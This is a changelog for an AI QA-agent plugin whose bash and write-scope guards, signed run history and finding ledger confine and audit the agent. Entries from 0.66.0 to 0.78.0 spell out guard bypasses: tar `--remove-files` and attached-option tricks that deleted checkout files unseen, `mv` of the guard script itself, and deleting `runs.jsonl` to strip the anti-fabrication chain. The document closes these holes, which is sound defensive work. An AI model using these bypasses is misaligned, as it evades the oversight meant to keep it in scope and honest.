# Changelog

Plugin and `verdict-mcp` share one version line; `.claude-plugin/plugin.json` and
`pyproject.toml` are bumped together.

## 0.78.0 — 2026-09-04 · "the maintainer's pen"

A fourth finding status, and the tester cannot write it.

**`accepted` — a risk the maintainer has weighed and declined to fix.** The
state knew three statuses, and VERDICT-F-21 showed they were one short. Its
residual risk was weighed on 2026-09-02, accepted, and written into a decision
journal — and for eight runs after that every banner, report and gate went on
counting it as an open Major, because `open` was the only honest word the
state had for it. `withdrawn` would have scored a correct finding as the
tester's error. That is the "same twenty findings until you stop reading"
failure this tool was built against, produced by the tool.

`verdict-accept <project> <id> --cite <ref> --reason <text>` writes
`accepted.json` beside `outcomes.json`. A citation and a reason are required —
an acceptance without one is a mute button. `--revoke` reverses it, with a
reason, and the reversal stays on the record; `--list` prints the ledger.

**Who holds the pen is the point.** The verdict agent is refused the file by
both scope guards, inside the QA root where everything else of its own is
writable; `validate_judgment` refuses `status: accepted` in a judgment with a
message naming the command instead; and the state validator refuses an
`accepted` finding without `accepted.by`, `.on` and `.citation`. Between runs
the gate, the session banner, the MCP server and `verdict-issues` apply the
ledger to a copy of the findings — the signed history row must still
re-derive from `state.json` as written — and `verdict-finalize` folds it into
the next state, signed. There the finding reads `accepted` with delta
`ACCEPTED`, leaves the open counts and the release blockers, is listed under
**Accepted risks** in every report with its citation, is never resolved by
silence, and settles in the outcome ledger as `confirmed` on a basis of its
own, `accepted` — kept apart from `measured` and `claimed` in the track
record, because the maintainer's word is neither a measurement nor the
tester's claim. A resolution still wins: a defect that is gone has nothing
left to accept, and fix verification runs as before.

An acceptance leaves the open counts at once and the verdict at the next run.
A decision changes the next verdict, never the last one — the gate keeps
returning `fail` on a run that measured an open Critical, whatever was
decided about it afterwards.

**Used on this repository first.** VERDICT-F-21 is accepted in
`.qa/accepted.json`, citing the DECISIONS.md entry of 2026-09-02. Run 13 will
be the first to render it apart.

**Prompt-free, and one line is owed to the prompt.** The agent writes `open`
as it always has; the harness does the rest. But the model will now meet
`status: accepted` and delta `ACCEPTED` in its own state file without having
been told what they mean — exactly the gap `test_every_delta_the_harness_
computes_is_explained` exists to catch, which is why `ACCEPTED` sits in
`STATE_DELTAS` (what a state may carry) and not in `DELTAS` (what the prompt
teaches and a judgment may write). A re-report is folded back to `accepted`
whatever the model infers, so the cost of the gap is confusion, not a wrong
state. The sentence that closes it is a prompt change, and a prompt change is
eval-paid here; it goes into the next prompt release with its measurement.
Nineteen tests cover the pen, the refusals, the fold, the guardrail
interaction, the report, the track record, the gate, the banner, the MCP
server and the issue filer.

**Measured.** Fifteen mutants in `eval/pinned_mutants.json` (`0.78.0 R1`–`R15`,
`--filter 0.78.0`) put each rule's defect back — `is_open`, the fold in both
of `merge`'s loops, the outcome basis, the judgment refusal, the citation
rule, both scope guards, the gate, the banner, the MCP server, the issue
filer, the report section, the track-record split and the between-runs fold:
**15 of 15 killed by the whole suite**.

## 0.77.0 — 2026-09-04 · "the harness stops guessing"

Run 12's remaining code findings, closed together — and the one that had been
mis-selecting for four runs.

**VERDICT-F-26 — fix verification no longer runs a test nobody chose.** Since
run 7 the harness picked, among several pytest ids scraped from a finding's
prose, whichever came first. 0.6x stopped *weighing* that pick; run 12 showed
the other half of the defect: the pick was still run, and this time the id came
out of the sentence that documents the mis-scrape itself — a pass/pass record
about a third party's test, written into the state as a measurement. A finding
that cites several tests in prose and declares none is now `unselectable`:
nothing runs, the record names the `candidate_tests`, the report counts it under
"not run", and `verification_notes` says what to declare. One cited test still
verifies, and still refuses a resolution when it fails at HEAD. The judgment
side needs no change — `verification_test` has been the tester's own citation
field since the loop closed — so this release is prompt-free.

**VERDICT-F-64 — the floor test reads the statement, not the text.** `FUTURE not
in src` was satisfied by a comment. `_future_annotations` walks the module body
and accepts only a real `from __future__ import annotations` placed where the
compiler accepts one; demoting the import to a comment fails the suite now,
measured. The same substring shape one file over — `assert "utf8_stderr()" in
src`, which run 12 listed among the unwatched rules (VERDICT-F-60) — is an AST
check that `main()` calls it.

**VERDICT-F-63 — the floor reaches `eval/`.** `python3 eval/run_eval.py` is a
README command, and three eval scripts died on 3.9 with F-55's exact TypeError
while the floor test globbed elsewhere. They carry the future import and
`eval/*.py` is in the floor set: verified on `/usr/bin/python3` 3.9.6, `--help`
exits 0 for all three.

**VERDICT-F-67 — every spelling of tar.** The dispatcher matched the exact
basename `tar`. On macOS that is bsdtar, which cannot `--remove-files` at all,
and the GNU tar that can is Homebrew's `gtar`: four findings' worth of rules
were unreachable on the one binary able to do the thing. `gtar` and `bsdtar`
reach the same handler, tested in both directions under four spellings.

**VERDICT-F-68 — `pin_check` reads pytest's summary.** Any non-zero exit was a
kill, so a mutant that broke collection would have scored as a defended rule.
`classify` needs a failed or errored test on the final summary line; every
other non-zero exit is ERROR — listed apart, out of the denominator, and failing
the run. Eight unit tests, including the nested case where a test that itself
runs pytest prints its own `1 failed` into captured output.

**VERDICT-F-69** — the comment pasted twice in the bash guard is one comment.

**Also:** `server.json` was three releases behind the other two manifests (the
MCP Server Registry still showed 0.49.0). `tests/test_versions.py` refuses a
commit in which the three disagree, with a control that plants that exact
drift and watches the check see it.

**Measured.** Every rule above has its defect put back in
`eval/pinned_mutants.json` (`0.77.0 Q1`–`Q7`, `--filter 0.77.0`): 7 of 7 killed
by the whole suite. The controls found two faults in the instrument before
they found any in the code: this project's `addopts = -q` doubled the check's
own `-q` and suppressed the summary line it read, and the first hook picked for
the commented-import mutant had no union annotation, so there was nothing to
comment out. Both are the shape F-68 is about.

**Not in this release, on purpose.** VERDICT-F-58 (the §3 instrument control
that cannot fire in F-50's ordering) is a prompt change and stays eval-paid.
VERDICT-F-21 is a maintainer decision (DECISIONS.md, 2026-09-02) — and the
reason the next release adds a way to record one, since the only way to stop
counting a correct finding today is to withdraw it, which counts against the
tester. VERDICT-F-60/F-65/F-66 — the nine uncatalogued survivors and the
mislabelled call-site entry — are the catalogue-honesty release after that.

## 0.76.0 — 2026-09-04 · "measure the tool, then encode it"

Run 12 found the tar handler bypassed five ways and my mutation catalogue
scoring it 100%. Both are fixed, and the second one is the more important.

**VERDICT-F-62 — the option walker ignored attached values.** It walked a bundle
letter by letter and took the next *token* for a letter that carries an
argument, so `-cf<scratch>/loot.tar` made `f` swallow `--remove-files` and the
deletion had no visible target. Measured against GNU tar 1.35 in a throwaway
checkout: guard allowed, tar exited 0, the checkout's directory gone. One space
turned the same command into a correct denial. Attached `-C<dir>` was worse —
`/` parsed as an option letter. This was VERDICT-F-42's swallowing again, in the
parser written to close VERDICT-F-42. It now follows getopt: the remainder of
the token is the value when there is one.

**VERDICT-F-56 — `-C` is positional, and the handler took the last one.** Real
tar changes directory at the point the flag appears, so every operand belongs to
the `-C` before it, and successive values compound (`-C /a -C b` is `/a/b`).
Taking the last and joining everything to it reported two scratch paths for
`-C <checkout> hooks -C <scratch> junk`, which tar answers by deleting both.
The walk is now ordered and carries the directory forward.

**The order this was done in is the point.** Every directory rule above was
measured by running GNU tar and looking at what was gone, *before* any code was
written. The reason `-C` was modelled as last-one-wins is that nobody had ever
executed it. Nineteen shapes now sit in the suite twice: once asserting the
guard's verdict, once running real tar and asserting the matrix still describes
it. On a stock Mac the second half skips honestly — bsdtar has no
`--remove-files`, so four findings' worth of rules are unreachable there.

**And the catalogue is enumerated from the code.** Run 12's sharpest fact: entry
30, *"tar operands stop being read relative to `-C`"*, was **killed** — a perfect
score on the rule it had just proved bypassable five ways. Mutation testing
answers whether a test would notice a line changing; it never answers whether the
line is right. 0.74.0 enumerated from the tests, 0.75.0 from the fix list,
neither from the source. Reading the parser and the handler line by line added
sixteen mutants covering every branch and operator — and immediately flagged
three catalogue entries as stale against the rewritten code rather than passing
them silently.

| enumerated from | mutants | result |
|---|---|---|
| the tests (0.74.0) | 21 | 21 killed, one named test each |
| the fix list (0.75.0) | 32 | 32 killed, whole suite |
| **the code (0.76.0)** | **46** | **45 of 45 killed, 1 equivalent** |

Five of the sixteen survived the first pass and four were real gaps no fix-list
enumeration could reach: `--` ending the option list, a long option's separate
value being read as a deletion target, a swallowed `--remove-files` in
`-c --remove-files -f`, and extraction reporting the shell's cwd instead of `-C`
— that last a false positive in the common case, since a run's cwd is nearly
always the checkout. The fifth is genuinely equivalent and is marked as such:
scoring a question with no answer only pressures someone into writing a test that
cannot fail.

**A latent flake, surfaced by working after dark.** Three tests computed expected
dates from the local clock while VERDICT-F-54 had moved the harness to the run's
UTC stamp. They go red the moment UTC crosses midnight ahead of a UTC-7 host and
green again seven hours later — passing in CI, failing on the maintainer's
machine, which is the worst way round. The same shape as VERDICT-F-24, which this
suite already has a test for. All three now read the run's clock.

## 0.75.0 — 2026-09-03 · "a rule nothing calls"

Run 11's first four findings, and the number in 0.74.0's own changelog that
turned out to be measuring the wrong thing.

**VERDICT-F-57 — "21 mutants, 21 killed" counted the tests I had just written,
not the rules I shipped.** Every mutant ran against one hand-named test, chosen
from the same reading of the same finding, so the pair could only confirm a rule
already watched. And the scripts lived in a scratch directory, so nobody could
reproduce the number — while the eval half of the very same release archived its
artifact. The concrete failure: **deleting the only call site of `_drop_bytecode`
left all 721 tests passing.** The killing mutant had changed the function's body.

`eval/pin_check.py` and `eval/pinned_mutants.json` ship instead of a claim.
Every mutant runs against the **whole suite**, the catalogue is data anyone can
read beside the number it supports, and it carries a class that did not exist
before: mutants that delete a **call site** while leaving the code correct.
"The code is right" and "the code runs" are different claims.

| | mutants | killed |
|---|---|---|
| 0.74.0, as published | 21 | 21, each against one named test |
| re-run against the whole suite | 29 | **27** |
| after closing both survivors, plus this release's rules | **32** | **32** |

The two survivors were the point. One was a README assertion of mine that asked
whether the string "3.9" appeared anywhere in the file — it does, inside a
parenthetical, so gutting the actual claim left the test green. The other was
the call site above.

**VERDICT-F-55 — the Bash guard was a silent no-op on macOS's system Python.**
`hooks/hooks.json` invokes bare `python3`; on a stock Mac that is
`/usr/bin/python3`, which is 3.9; `str | None` in a signature is evaluated when
the function is defined, so the guard raised `TypeError` and exited 1. Under the
same interpreter `enforce_write_scope.py` kept denying with exit 2, so a strict
session **looked armed with half its controls missing**. `requires-python` binds
pip, and a plugin is not installed by pip.

Nine modules now defer their annotations. Measured on 3.9.6: the guard denies
with its reason and lets `pytest` through, the gate reads a state, the validator
passes, every hook still fails open on malformed input, and all four entry points
behave identically to 3.13. The README states the floor, and
`tests/test_interpreter_floor.py` enforces it by *parsing* for the syntax — CI has
3.10 and 3.13 and no way to run the interpreter that exposed this.

**VERDICT-F-56 and F-59 — two more tar bypasses in the family 0.74.0 fixed.**
tar reads its operands relative to `-C`, and the handler yielded them bare: from
a scratch working directory, `-C <checkout> hooks` resolved to `<scratch>/hooks`,
a path that does not exist and is allowed, while tar deleted the checkout's copy.
And `-T <file>` puts the operands in a file, so nothing on the command line named
them and the handler yielded nothing at all — the module already had a word for a
target it cannot see, and this site did not use it. Both are tested in both
directions from a third directory, because a fix that only ever refuses more is
not a distinction.

**VERDICT-F-61** — a published count contradicting its own measurement, inside a
declared trust anchor. Fixed with run 11's record.

**What the tool cost to build, recorded because it is the same shape as what it
hunts.** A killed run left a mutation in the working tree, where it read as a test
failure rather than as a mutant nobody put back — so the runner now restores on
interrupt, kill and hangup, proven by sending it a real signal mid-run. Two
instances started together and one read a failure the other had caused — so it
takes a lock. And running it while editing produced a hand-probe that reported a
guard bug which was only the mutant of the moment; that one has no technical
remedy and is written at the top of the file instead. Three times, the code was
right and the conditions around it were not.

**Not in this release, on purpose.** VERDICT-F-58 — §3's instrument control cannot
fire in the ordering VERDICT-F-50 described, because the bytecode is written once
at the first injection and re-running it reads its own genuine cache. The
prophylactic half works (0 of 2 caught with the cache in place, 2 of 2 swept). The
cure is a contract change, prompt edits are eval-paid here, and the release that
found a problem does not get to author its own evidence.

## 0.74.0 — 2026-09-03 · "the right answer to the wrong question"

Run 10's eight findings, closed together. Six of them share a shape: a check that ran, and
reported truthfully, about something other than what it was asked.

**The integrity one first (VERDICT-F-52, Major).** 0.73.0's entry said prompt edits are
eval-paid here "so this one was paid". Run 10 checked. No row was published, the eval
directory was untouched by that release, the run was never archived — and the fixture the
entry named holds no importable package and no scored row about re-injection isolation, so
it cannot tell the new contract from the old one. 6/6 established that the edit did not
regress the fixture. It did not establish that the new instruction works, which is what
"paid" implied. The 0.73.0 entry now says so, and this release pays properly — on the
`cause` fixture, which is the one that exercises §3, against a byte-identical control:

| rows | treatment (v0.74.0 prompt) | control (v0.73.0 prompt) |
|---|---|---|
| the six that predate the clause | 5/6 · 5/6 · 6/6 | 5/6 · 5/6 · 6/6 · 6/6 |
| `counterfactual-isolated-from-stale-bytecode` | **3 of 3** | **0 of 4** |

Indistinguishable on everything that existed before, completely separated on the thing that
changed. Every treatment run exported `PYTHONDONTWRITEBYTECODE=1`, swept `__pycache__`
between injections and ran an instrument control; no control run did any of the three. The
seventh row is new, and it is the part that answers F-52's actual complaint — which was
never the score, but that no fixture could tell one version of this contract from another.
Its first draft accepted the bare string `__pycache__` and a control run earned it for
saying the checkout was "clean apart from `__pycache__`"; that is housekeeping, and the
control is what caught it. A fourth treatment run died on an API 529 with no state written
and is recorded as void, not as zero: a server error is not a measurement. The row, the
control, the void run and the archived 7/7 are all in `eval/README.md`.

**The series also caught something nobody was looking for.** The `trigger` row misses 2 of 3
treatment runs and 2 of 4 control runs — so not this release, and not amended away. It was
last measured at 6/6, n=1, four days and 225 prompt-lines ago, against a command file that
has since been rewritten. A single reading never established the row was reliable, so it is filed as a
measured weakness for the next run. Fixing it is a prompt change, and a prompt change is
eval-paid; it does not get smuggled into the release that found it.

**The isolation step 0.73.0 added is defeated by a stale bytecode cache (VERDICT-F-50,
Major).** CPython validates a cached module on the source's modification time in *whole
seconds* plus its size, so two same-size injections written inside one second are
indistinguishable and the second silently runs the first's bytecode.

| re-injection campaign | mutants caught |
|---|---|
| with `__pycache__` in place | **4 of 5** |
| swept | **5 of 5** |

The check 0.73.0 prescribed — print the loaded module's `__file__` — was correct in both
runs, because the path was never what was wrong. §3 now carries the bytecode clause and,
more importantly, a check that *can* fail: re-run an injection you have already watched
fail, and if it now passes you are measuring the cache. The harness stopped relying on
prose: every verification subprocess runs with `PYTHONDONTWRITEBYTECODE=1`, and the scratch
worktree is swept before the previous-commit run — the two are not the same guarantee, one
stops a cache being written and only the other stops one being read.

**The bash guard read its own option grammar by substring, in both directions.**
`--remove-files` contains an `f`, so it was treated as taking an argument and swallowed the
operand behind it: `tar -cf <scratch>/loot.tar --remove-files <checkout>/hooks` archived the
checkout away and the guard saw no target (VERDICT-F-42, Major — 0.71.0 had closed only the
one command the original finding quoted). `--exclude` contains an `x`, so a plain create
read as an extraction and `tar --exclude=.venv -cf ...` was denied — the contract's own
scratch-copy step, refused (VERDICT-F-49). tar's options are now parsed as options: a short
bundle, a long name, an old-style leading bundle, `--opt=value` and `--opt value` alike.

**And it read shell metacharacters inside quotes as live syntax (VERDICT-F-22).** Four
read-only commands blocked in one QA run: a `{rc:>3}` format spec and a quoted `"<tmp>"`
inside heredoc bodies, a `->` in a docstring, and a genuine redirect whose relative target
was resolved against the tool's cwd instead of the `cd` beside it. Redirects and separators
are now located in a masked view of the command where quoted text and heredoc bodies are
blanked, and read back from the original so a quoted path arrives whole; a `cd` carries
across `&&` and `;` but not into a pipeline stage. The fail-closed rule survives: a command
that leaves a quote open is scanned twice, once as the shell would read it and once raw, so
nothing hides behind a quote it never closes.

**Two sentences that contradicted the number printed beside them.** The `Up to N` footnote
0.72.0 added took the largest single bucket where its sentence scopes over the whole column,
publishing `Up to 17` where 21 of 28 confirmations were unrecorded — leaving a reader to
subtract and credit 11 to the tester's word when the true figure was 7 (VERDICT-F-51). And
the retry-marker narration said "minutes ago" for anything inside a six-hour window, beside
its own `age_hours: 2.01` (VERDICT-F-53). Third and fourth of this shape after F-36 and
F-45.

**Findings were dated by the machine's local calendar inside a state timestamped in UTC**
(VERDICT-F-54). On a host running behind UTC, every run in that window filed findings dated
the day before its own state, report filename and INDEX row — permanently, since
`first_seen` is copied forward for the life of a finding and `age_days` is measured from it.
`merge()` now reads the date off `last_run.timestamp_utc`, so the two agree by construction
even when a run straddles midnight.

Every rule here is mutation-checked: 21 mutants, 21 killed, including over-correction
mutants that must *not* fire and regression mutants for the behaviour the rewrite could
have dropped — among them `eval "... > file"`, which the masked view turns into quoted text
and which the raw scan used to catch by accident, and the Windows tokenizer's habit of
leaving a nested command's quotes on, which would have made that same branch dead on one
platform and live on the other.

**Every guard now pins its stderr to UTF-8**, which the Windows leg also surfaced. Each one
explains itself in prose containing an em-dash; on Windows stderr defaults to the console
codepage, so the byte written is cp1252's `0x97` while the caller decodes UTF-8 and the
explanation arrives as a `UnicodeDecodeError` raised inside a subprocess reader thread. The
easy misreading is an empty message rather than a lost one — and a guard that blocks without
a readable reason blocks for nothing. Shared helper in `hooks/qa_paths.py`, wrapped so a
stream it cannot configure still lets the hook run, because fail-open is the rule everywhere
else here. The test helper that spawns these hooks was decoding on the locale default too,
so on Windows every assertion about a guard's reason was passing or failing for reasons
unrelated to the guard.

**A note on the platform the guard nearly shipped broken on.** Backslash is an escape on
POSIX and a path separator on Windows, and this module had already chosen — its tokenizer
runs shlex with `posix=False` there precisely so paths keep their separators. The new
masker and target reader did not follow, and `C:\Users\…\repo\src` reached the check as
`C:Usersreposrc`, which then read as a *relative* path resolving inside the checkout: three
correct commands denied and one deletion target named something nothing matches. Only the
Windows CI leg could see it. Both platforms' branches are now exercised on both platforms,
by forcing the flag. Two of those kills were against my own new tests — one
asserted on an environment variable it had inherited rather than one the code set, and one
chose fixture numbers where the broken maximum happened to equal the correct sum. A test
that cannot fail is the thing this release is about.

## 0.73.0 — 2026-09-02 · "a counterfactual you did not isolate is evidence of nothing"

**The agent contract names the isolation step** (VERDICT-F-43, run 9's sharpest finding, and
the only one of its seven whose cure is a prompt change).

The contract tells the tester to prove causation by flipping the suspected cause in a scratch
copy — and the bash guard was widened in 0.65.0 specifically so `cp -a <checkout> <scratch>`
would be allowed, for exactly that purpose. A copied tree carries the project's virtualenv,
and an editable install's `.pth` names the **original** checkout absolutely. `sys.path` puts
site-packages ahead of nothing, so the scratch imports the unmodified source and every
injection reads as a no-op.

Verdict measured it rather than reasoning about it: four defects injected into a scratch
copy, each run twice, identical but for one environment variable.

| | defects caught |
|---|---|
| without `PYTHONPATH` | **0 of 4** |
| with `PYTHONPATH=<scratch>/src` | **4 of 4** |

The blast radius is the reason this is not a footnote. A false negative reads as a green
counterfactual, which the contract converts into `fix_verified: true`, which becomes a
`confirmed` ledger row, which the published track record counts as "held up". Silent, and
self-flattering in precisely the direction those rules exist to prevent.

§3 now carries the step, the one-line check to run before trusting the result
(`python -c "import <pkg>; print(<pkg>.__file__)"` must print a path inside the scratch), and
the flat statement that a green counterfactual you did not isolate is evidence of nothing.
§6's `fix_verified` clause points at it. The harness's own verifier already did this and
records the `pythonpath` it used; only the agent-facing prose was missing it.

**Prompt edits are eval-paid here. This one was under-paid; 0.74.0 pays the difference.**
The seeded pricer eval scored **6/6 with no hard failures** against the edited prompt,
matching the published baseline. But that run was never archived, no row was published in
`eval/README.md`, and the pricer fixture holds no importable package and no scored row
about re-injection isolation — so it cannot tell this contract from the one before it.
6/6 establishes that the edit did not regress the fixture. It does not establish that the
new instruction works, which is what "paid" implied. Filed by run 10 against this very
paragraph (VERDICT-F-52); the measured payment is the dated row in `eval/README.md`.

## 0.72.0 — 2026-09-02 · "five guards nobody was watching"

Run 9's four Minor findings. Three are against work from the previous two days, and one is
against a sentence I wrote.

**Five guards could have been broken without a test noticing** (VERDICT-F-48). Run 9 ran
the mutation-campaign method this repository documents, controlled the instrument first as
the profile requires, and re-measured: 391 killed against the original 335, +56 from the
0.67.0 and 0.69.0 work. Of its nine non-string survivors, two died against the whole suite
and two are the clock tolerances already accepted as equivalent. **Five were real**: the
judgment validator's `status` enum — the field that decides whether a finding is even open,
and the only one of its neighbours without a test — two loop `continue`s whose mutation to
`break` stops checking after the first malformed entry, and both exit codes of the
PostToolUse hook, the surface that catches a bad state while the run is still going. It
proposed the checks; they are written, and each fails when its mutant is applied.

The profile's own summary said the residual was "mostly message text". That understated it
in the direction that flatters, and now says what was measured.

**A reader could subtract their way to a wrong conclusion** (VERDICT-F-45). The Track record
table added yesterday showed `19 | 0` under a caveat calling measured and claimed
exhaustive, so nineteen confirmations settled before `outcome_basis` existed read as
nineteen resting on the tester's word. The state is careful here and deliberately refuses to
relabel them; the renderer was not — the same split-brain shape as the finding it came from,
one release later. The table now says how many predate the field and that they are neither
kind.

**The ledger digest keeps what makes it readable** (VERDICT-F-46). It dropped `candidates`,
without which `selected_by: first_cited` says nothing, and `not_weighed`, without which a
confirmation standing beside a test that failed at HEAD has no explanation at all.

**The symlink case is tested** (VERDICT-F-47). The 0.70.0 changelog claimed four tests, one
per blind spot. Three covered blind spots and the fourth was a green-path control; the
symlink swap was fixed and unverified. That claim has been corrected in place rather than
quietly left, because a changelog that overstates its own coverage is the same defect as a
check that cannot fire.

## 0.71.0 — 2026-09-02 · "production is the number to read"

Run 9's two Majors that are code. It also resolved every fix from the previous range —
F-39, F-36, F-13, F-40 and F-41 — so what follows is what those fixes did not reach.

**Diff coverage reports production and test code separately** (VERDICT-F-44). The percent
blended both, and test lines carry a structural unexercised tax: a fixture body and a
`def test_*` line never carry a test context, by the same rule that makes the production
number trustworthy. So the figure moved with the *shape* of the diff. Across two runs of
this repository it fell from 91% to 78% while production changed-line coverage rose from
97% to 100% — a thirteen-point "regression" that was thirty-four of thirty-four production
lines covered.

That matters because the gate reads it. A release whose diff is mostly tests trips a false
alarm, and this project's releases are mostly tests; worse, a real production drop can hide
behind a large green test diff. `coverage.by_kind` now carries both numbers and the report
leads with production, saying why.

The test is the one the finding asked for: a two-commit fixture adding one unexercised
production line and forty lines of passing test code. Blended, the percent rises. By kind,
production reads 0%.

**Archiving the checkout away is refused** (VERDICT-F-42). The bash guard's `tar` handler
returned early on anything that was not an extraction, so
`tar --remove-files -cf <scratch>/loot.tar <checkout>/hooks` was permitted — the same
remove-what-you-read shape as the `mv` regression F-39, in another costume. Creating an
archive still only reads; creating one that deletes what it archived does not.

The first pass at this shipped without tests, and the mutation check caught that: reverting
the fix left the suite green. Three tests now cover deleting, not deleting, and extracting.

## 0.70.0 — 2026-09-02 · "the number a human actually reads"

**The Track record table prints the split** (VERDICT-F-36, the half that stayed open). 0.64.0
recorded `outcome_basis` and split the counts in `state.json` — and left `_render_calibration`
printing one `Held up` column under a footnote reading *"a finding merely resolved is not
evidence either way"*, which that same release made false. Run 8 measured it: the renderer was
byte-identical to the version run 7 had cited, so the fix had reached the state and stopped
before the artifact almost everyone reads.

The table now carries an `of those, measured` column, and a caveat under it saying `held up`
covers two unequal things. Both appear only where something was actually claimed — a project
whose confirmations are all measured keeps the plain table and reads no caveat about a kind of
row it does not have. The footnote says what the rule is.

**The fixture-freshness gate reproduces the fixture, not its text** (VERDICT-F-13, the oldest
Minor). It rebuilt the pair with `copyfile`, which copies bytes: an executable bit flipped or a
symlink swapped for a regular file came back identical and the gate reported OK over a changed
fixture. It now uses `copy2(follow_symlinks=False)`, so `git diff` reports mode and type
changes as what they are. A tracked file missing from the working tree is reported instead of
tracebacking, and an untracked file planted under the fixture — which no committed diff can
describe — is named and refused.

That gate had no tests. It has four now — a green-path control plus one each for the mode
change, the planted untracked file and the missing tracked file — each failing when its fix
is reverted. (The symlink case named above was fixed here and left untested; run 9 said so,
and 0.72.0 covers it.)

## 0.69.0 — 2026-09-02 · "the CLI nobody had tested, and a test its own crash fooled"

The rest of the mutation campaign's survivors. 0.67.0 closed the thirteen in the rule
bodies; these are the ten around them.

**A test that could not tell a working message from a crash.** `test_cli_exit_codes`
asserted a violation run exits 1 with `"violation"` somewhere in stderr. Break the very
line that prints it — `+` for `-` between the two halves of the message — and Python prints
a traceback that *quotes the source line*, which contains the word `violation(s)`. Exit
code 1, the word present, test green, message gone. It now asserts there is no traceback
and that stderr begins with the real prefix.

**`verdict-validate`'s other surfaces had no tests at all.** `--quiet` could be inverted
and nothing noticed; `--previous` could be ignored entirely, or report its own read error
under the wrong exit code. All three are pinned, including that a stale `--previous` makes
the run-number check fire and a good one leaves the state clean.

**Four guards on the state side.** A single unexercised changed line is still refused
(`> 0`, not `> 1`). `run_number` must be a positive integer rather than a string that
merely compares. `last_run.report` must be a non-empty string. And the unmeasured-suite
refusal names *which* gate was unreadable, without sweeping in the lint gate that
legitimately parses to no counts — with its empty-list fallback pinned too.

**Three twins.** The three rules 0.67.0 fixed on the judgment side were alive again in
`validate`. Both copies are pinned now.

Twenty-three of the campaign's 53 operator-and-boundary mutants are killed across the two
releases. What survives is mostly message text, plus two `>` → `>=` mutants at the clock
tolerances that differ by one second — accepted as equivalent rather than papered over
with a test that would only ever pass.

## 0.68.0 — 2026-09-02 · "a copy reads its source; a move removes it"

**Fixes a guard regression 0.65.0 shipped** (VERDICT-F-39, Major/P1, filed by run 8). The
copier fix taught the strict bash guard that a copy only writes its destination — true of
`cp`, `install`, `rsync` and `ln`, and not of `mv`, which was in the list with them. So the
guard began permitting `mv <checkout>/hooks/enforce_bash_scope.py /tmp/`: the agent moving
the guard itself out of the way, one commit after that exact command was denied.

`mv` now yields every operand, source and destination alike, and so does
`rsync --remove-source-files`. Copying *out* of the checkout still works, which was the
whole point of the previous fix, and copying *into* it is still refused. All four
directions are probed by tests, and the over-correction — treating every copy as a move —
fails three of them.

**A measurement the harness declined to weigh no longer denies a ledger row**
(VERDICT-F-40). `_apply_verification` stamps `not_weighed` on a test chosen by prose order
from several candidates and refuses to reopen a finding with it. The outcome rule read the
same record, saw a failure at HEAD, and denied the row anyway — under a reason saying the
opposite of the note sitting beside it. Two layers, one record, contradictory readings.

**The ledger keeps the measurement, not only the sentence about it** (VERDICT-F-41). A row
outlives its finding, so a `confirmed` could not be audited once `state.json` dropped it:
19 of this repository's 21 confirmed rows were unjoinable when run 8 went looking, which is
the join run 7 had asked the next run to perform. Rows now carry the test, both results and
how the test was chosen — four fields, because a row is a hundred bytes and not a finding.

## 0.67.0 — 2026-09-02 · "the rules that guard the model were the unguarded ones"

**A mutation campaign over `validate.py`**, the last of the six "champion" moves and the
one that asks whether 639 green assertions are worth anything. `mutmut` was already in the
dev group and had never been run.

The raw number was not the finding. 574 mutants, 335 killed by `tests/test_validate.py`
alone — but 239 survivors, of which 186 only rewrite a message string. The 53 that change
an operator, a boundary or a guard were re-checked one at a time **against the whole
suite**, and the shape they made was consistent and backwards:

> the rules in `validate` were pinned; their twins in `validate_judgment` were not.

`validate` guards the finished state, which the harness computes and which the chain
signs. `validate_judgment` guards what the *model* writes, and is the first place a
fabricated claim is refused. Nine tests now pin it: `fix_verified` must be a boolean and
must cite the test that failed on re-injection, `failure_classification` is checked but
optional, two findings may not share one id, the message names which finding broke the
rule, every finding is checked rather than the first, and a `pass` is capped by an *open*
Critical or Blocker — with the other half of each rule tested too, because a check that
fires on everything is one nobody reads.

Four more boundaries on the state side: both clock tolerances, `verified_intact`'s shape,
and the three guards on the zero-coverage refusal.

**One source change.** `_parse_z(str(ts))` stringified its argument before the function's
own type guard could see it, so no input could tell a working guard from a broken one —
which is why the mutation was still alive. It now receives the value as given. Same
message, same behaviour, and testable.

**Two things worth recording about the campaign itself.** Fifteen consecutive survivors
with no kills looked wrong, so the instrument was checked before the result was believed:
applying a mutant the tool reports as *killed* does fail the suite, so the survivals were
real. And the first cut of the tolerance test derived its probe from the constant under
test — widen the constant and the probe moves with it, and the check can never fail. It now
uses literal probes straddling each boundary, and is checked against a move in **both**
directions.

## 0.66.0 — 2026-09-02 · "a signal you can delete is not a signal"

**The run-history chain gets a cross-file ratchet** (VERDICT-F-21, open since run 4 and the
oldest Major on the board). The chain's ratchet lived entirely inside `runs.jsonl`: once a
row carried a link, dropping a later one was a break. But a history with no links at all
reads `unchained`, and `unchained` is accepted — deliberately, because every project is
unsigned until its next harness run and failing them all would be a migration by ambush.

So the entire anti-fabrication signal came off with one `rm`. Delete `runs.jsonl`, drop
`last_run.chain`, and `--require-harness` exits 0 over a state nothing can vouch for.

`verdict-finalize` now records `chain: {since_run, last_link}` in `outcomes.json` — the
permanent ledger, a different file with a different job — and `verify_chain` reads it. A
project with no anchor and no links is still `unchained` and still accepted, so a genuine
pre-upgrade project is untouched. A project whose ledger says it has been chained, and
whose history no longer carries that link, is broken.

That covers the forger's best move, which is not an unsigned history but a *correctly
signed* one begun from a start of their own choosing. Such a history verifies perfectly
against itself — no internal ratchet can ever see it — and does not contain the run the
ledger recorded.

**Two of this repository's own tests were encoding the evasion.** Both built their
"pre-upgrade project" by running a chaining finalize and then stripping the links, which is
indistinguishable from tampering, and asserted the result was accepted. They now build a
project that genuinely never chained — no anchor, because nothing ever wrote one — and the
stripped-but-anchored case is a new test asserting the opposite.

Shedding the signal still is not impossible. It now costs the permanent track record: every
decided outcome the project ever recorded, and the next report says how many it is tracking.

## 0.65.0 — 2026-09-02 · "which test, and who chose it"

**Fix verification ranks its candidates** (VERDICT-F-26, open since run 5 and the root of
run 7's F-35). The citation filter shipped in 0.57.0 stopped *invalid* ids; selection among
valid ones was still evidence order, so on run 7 the harness ran a non-guarding test for
every finding it verified — `F-31`'s re-injection ran the subprocess-coverage test from the
release before it, and reported `pass → pass`.

Order is now the choice. An explicit `verification_test` leads. Then any id the collector
saw for the first time this run, which is what a fix's own regression test looks like.
Prose order comes last and is labelled as such: every record carries `selected_by`
(`explicit`, `added_this_run`, `first_cited`) and `candidates`.

**And a test nobody chose may not overrule the tester.** Refusing a resolution is the
strongest thing a measurement does, and a `first_cited` pick among several candidates is
prose order, not a citation. The measurement is still recorded, with a `not_weighed` note
